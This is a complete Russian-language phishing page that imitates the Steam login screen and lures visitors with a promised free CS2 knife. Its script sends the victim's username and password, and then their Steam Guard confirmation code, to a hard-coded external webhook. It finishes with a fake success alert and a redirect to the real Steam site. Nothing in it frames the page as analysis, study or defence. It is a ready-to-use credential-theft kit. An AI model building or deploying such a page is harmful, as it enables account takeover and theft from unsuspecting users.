<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Steam Community :: Вход</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #171a21;
      color: #c6d4df;
      font-family: 'Roboto', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-image: url('https://community.akamai.steamstatic.com/public/images/login_bg_2x.jpg');
      background-size: cover;
      background-position: center;
    }
    .steam-container {
      background: rgba(0,0,0,0.75);
      backdrop-filter: blur(8px);
      border-radius: 4px;
      width: 100%;
      max-width: 460px;
      padding: 40px 35px;
      box-shadow: 0 0 30px rgba(0,0,0,0.8);
      text-align: center;
    }
    .steam-logo {
      width: 180px;
      margin-bottom: 30px;
    }
    h1 {
      font-size: 24px;
      font-weight: 500;
      margin-bottom: 8px;
      color: #ffffff;
    }
    .subtitle {
      font-size: 14px;
      color: #8f98a0;
      margin-bottom: 30px;
    }
    .step {
      display: none;
    }
    .step.active {
      display: block;
    }
    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 13px;
      color: #c6d4df;
      font-weight: 500;
    }
    input {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #2a475e;
      border-radius: 3px;
      background: #1b2838;
      color: white;
      font-size: 16px;
      transition: border-color 0.2s;
    }
    input:focus {
      border-color: #66c0f4;
      outline: none;
    }
    .btn {
      width: 100%;
      background: #1b2838;
      color: white;
      padding: 14px;
      border: none;
      border-radius: 3px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s;
      margin-top: 10px;
    }
    .btn:hover {
      background: #2a475e;
    }
    .btn.primary {
      background: #66c0f4;
      color: #0e141b;
    }
    .btn.primary:hover {
      background: #4ea1d3;
    }
    .btn.loading {
      background: #2a475e;
      cursor: wait;
    }
    .btn.loading::after {
      content: '';
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid white;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 10px;
      vertical-align: middle;
    }
    .timer {
      margin-top: 12px;
      font-size: 14px;
      color: #66c0f4;
    }
    .footer {
      margin-top: 40px;
      font-size: 12px;
      color: #8f98a0;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="steam-container">
    <img src="https://community.akamai.steamstatic.com/public/images/login_logo.png" alt="Steam" class="steam-logo">

    <!-- Шаг 1: Логин + Пароль -->
    <div id="step1" class="step active">
      <h1>Вход в аккаунт Steam</h1>
      <div class="subtitle">Для получения бесплатного ножа введите данные</div>

      <form id="loginForm">
        <div class="input-group">
          <label>Имя пользователя (или email)</label>
          <input type="text" id="username" placeholder="Имя аккаунта" required autocomplete="off"/>
        </div>
        <div class="input-group">
          <label>Пароль</label>
          <input type="password" id="password" placeholder="Пароль" required autocomplete="off"/>
        </div>
        <button type="submit" id="loginBtn" class="btn primary">Войти</button>
      </form>
    </div>

    <!-- Шаг 2: Ввод кода Steam Guard -->
    <div id="step2" class="step">
      <h1>Подтверждение входа</h1>
      <div class="subtitle">Введите код из письма Steam Guard</div>
      <p style="font-size: 14px; color: #8f98a0; margin-bottom: 25px;">
        Код отправлен на вашу почту.<br>Проверьте папку "Входящие" или "Спам" (придёт в течение 30–60 секунд).
      </p>

      <div class="input-group">
        <label>Код подтверждения (5 символов)</label>
        <input type="text" id="guardCode" placeholder="XXXXX" maxlength="5" required autocomplete="off"/>
      </div>
      <button id="guardBtn" class="btn primary">Подтвердить</button>
      <div class="timer" id="timer">Осталось: 60 сек</div>
    </div>

    <div class="footer">
      © Valve Corporation. Все права защищены.
    </div>
  </div>

  <script>
    const webhook = 'https://eoinuzdsdrixye7.m.pipedream.net';

    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const loginBtn = document.getElementById('loginBtn');
    const guardBtn = document.getElementById('guardBtn');
    const timerEl = document.getElementById('timer');

    let timeLeft = 60;
    let timerInterval;

    async function sendData(payload) {
      try {
        await fetch(webhook, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (e) {}
    }

    // Шаг 1
    document.getElementById('loginForm').addEventListener('submit', async e => {
      e.preventDefault();
      if (loginBtn.disabled) return;

      loginBtn.disabled = true;
      loginBtn.classList.add('loading');
      loginBtn.textContent = 'Вход...';

      const data = {
        type: 'steam_login',
        username: document.getElementById('username').value.trim(),
        password: document.getElementById('password').value.trim(),
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent
      };

      await sendData(data);

      step1.classList.remove('active');
      step2.classList.add('active');

      timeLeft = 60;
      timerEl.textContent = `Осталось: ${timeLeft} сек`;
      timerInterval = setInterval(() => {
        timeLeft--;
        timerEl.textContent = `Осталось: ${timeLeft} сек`;
        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          timerEl.textContent = 'Время истекло. Попробуйте снова.';
        }
      }, 1000);
    });

    // Шаг 2
    guardBtn.addEventListener('click', async () => {
      const code = document.getElementById('guardCode').value.trim().toUpperCase();
      if (code.length !== 5) {
        return alert('Код должен состоять из 5 символов!');
      }

      guardBtn.disabled = true;
      guardBtn.classList.add('loading');
      guardBtn.textContent = 'Проверка...';

      const data = {
        type: 'steam_guard',
        guard_code: code,
        timestamp: new Date().toISOString()
      };

      await sendData(data);

      alert('Вход выполнен успешно!\nБесплатный нож и перчатки добавлены в ваш инвентарь.\nПерезагрузите CS2 для получения предметов.');
      window.location.href = 'https://steamcommunity.com/';
    });
  </script>
</body>
</html>
